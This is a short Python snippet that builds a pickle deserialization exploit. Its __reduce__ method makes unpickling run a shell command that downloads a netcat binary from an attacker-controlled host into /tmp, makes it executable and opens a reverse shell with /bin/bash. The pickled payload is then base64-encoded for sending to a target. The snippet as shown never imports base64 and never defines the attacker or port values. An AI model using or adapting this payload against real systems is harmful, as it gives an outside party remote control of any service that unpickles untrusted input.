import pickle, os

class RCE:
    def __reduce__(self):
        cmd = ('curl http://%s/nc -o /tmp/nc && chmod +x /tmp/nc && /tmp/nc %s %s -e /bin/bash' % (attacker,attacker,port))
        return os.system, (cmd,)

rce = pickle.dumps(RCE())

# encode to base64 for transmission
rce_b64 = base64.urlsafe_b64encode(rce).decode('utf-8')

